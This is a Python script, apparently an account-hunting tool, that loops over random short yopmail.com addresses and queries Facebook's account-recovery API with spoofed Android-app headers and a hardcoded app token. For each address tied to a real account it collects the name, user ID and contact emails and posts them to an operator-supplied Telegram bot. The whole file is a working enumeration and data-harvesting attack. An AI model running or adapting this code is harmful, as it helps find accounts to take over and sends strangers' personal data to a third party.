

import os,sys
import requests,random,json

OK = 0
BAD = 0

R = '\x1b[38;5;1m'   # أحمر
M = '\x1b[38;5;244m' # رمادي 
L = '\x1b[38;5;10m' #اخضر 
G = '\x1b[38;5;190m'
os.system("clear")

tok=input(f"{L} Token :")
os.system("clear")

id=input(f"{L} id :")
os.system("clear")

def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{tok}/sendMessage"
        data = {"chat_id": id, "text": message}
        requests.post(url, data=data, timeout=5)
    except:
        pass

if not tok or not id:
	print(R+" توكن وايدي لازم تدخلهم ")
	sys.exit()

ibra = "qwertyuioplkjhgfdsamnbvcxz"

while True:
	len = random.randint(3,5)
	
	email ="".join(random.choice(ibra) for _ in range (len)) + "@yopmail.com"

	headers = {
	    'Host': 'b-graph.facebook.com',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
	    'Accept-Encoding': 'gzip',
	    'X-Fb-Friendly-Name': 'accountRecoverySearch',
	    'Authorization': 'OAuth null',
	    'User-Agent': '[FBAN/FB4A;FBAV/417.0.0.33.65;FBBV/480086274;...]',
	    'X-Fb-Sim-Hni': '41805',
	    'X-Fb-Device-Group': '3338',
	    'X-Fb-Connection-Quality': 'EXCELLENT',
	    'X-Fb-Net-Hni': '41805',
	    'X-Tigon-Is-Retry': 'False',
	    'X-Fb-Connection-Type': 'WIFI',
	    'Priority': 'u=3,i',
	    'X-Fb-Http-Engine': 'Liger',
	    'X-Fb-Client-Ip': 'True',
	    'X-Fb-Server-Cluster': 'True',
	}
	
	data = f"q={email}&friend_name=&qs=&summary=true&device_id=d15ef240-9126-44ab-9574-049eb0802d8c&src=fb4a_account_recovery&machine_id=&sfdid=a6ca2f76-0995-4db7-9083-667fc42d836d&fdid=d15ef240-9126-44ab-9574-049eb0802d8c&sim_serials=%5B%5D&sms_retriever=false&cds_experiment_group=-1&oe_aa_experiment_group=-1&oe_aa_experiment_group_immediate_exposure=-1&shared_phone_test_group=&allowlist_email_exp_name=&shared_phone_exp_name=&shared_phone_cp_nonce_code=&shared_phone_number=&is_auto_search=false&is_feo2_api_level_enabled=false&is_sso_like_oauth_search=false&encrypted_msisdn=&locale=en_US&client_country_code=IQ&method=GET&fb_api_req_friendly_name=accountRecoverySearch&fb_api_caller_class=AccountSearchHelper&access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
	
	response = requests.post('https://b-graph.facebook.com/recover_accounts', headers=headers, data=data).text
	

	if '"data":[' in response and '"data":[]' not in response:
	    OK += 1
	    result = json.loads(response)
	    account = result['data'][0]
	    name = account.get('name', 'N/A')
	    user_id = account.get('id', 'N/A')
	    contacts = account.get('contactpoints', {}).get('data', [])
	    emails = []
	    for contact in contacts:
	        if contact.get('type') == 'EMAIL':
	            emails.append(contact.get('display', 'N/A'))
	    profile_pic = account.get('profile_pic_uri', 'N/A')  
	
	    msg = f"""✅ OK!
Name or email : {name}
ID Fecbook : {user_id}
Emails : {', '.join(emails)}
 Link : https://www.facebook.com/{user_id}"""
	    send_telegram(msg)
	
	else:
	    BAD += 1
	print(f"\r{L} GOOD : {OK} | {R} BAD : {BAD} | {G} {email}",end="")